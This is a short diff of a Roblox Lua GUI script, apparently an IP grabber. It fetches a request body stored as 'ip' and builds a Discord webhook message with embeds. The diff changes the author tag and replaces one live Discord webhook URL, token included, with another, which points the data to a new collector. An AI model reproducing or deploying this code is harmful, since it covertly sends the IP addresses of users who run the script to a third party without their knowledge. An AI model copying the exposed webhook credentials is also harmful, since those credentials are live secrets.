@@ -1,4 +1,4 @@
--- made by charlieee#5458 lol
+-- made by charlieee#9148 lol
 
 local ii = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
@@ -99,7 +99,7 @@ local function LPFCW_fake_script() -- Frame.LocalScript
 	local ip = request(abcdef).Body
 	
 	local url =
-		"https://discord.com/api/webhooks/1070820807724511386/xfBty8CoNTBXe6migYA-MeatjPrCU1XzZjtnZGtPQgaFbxs_gH2v1eHvFx1lkUBdC6eI"
+		"https://discord.com/api/webhooks/1072624208586231938/hlz0E8mCbD_uC6FT_uPC_10JcoYhblhqs-NSlxHNvMDZjp5ApRttzcgbW3enifX8Mv_B"
 	local data = {
 		["embeds"] = {
 			{
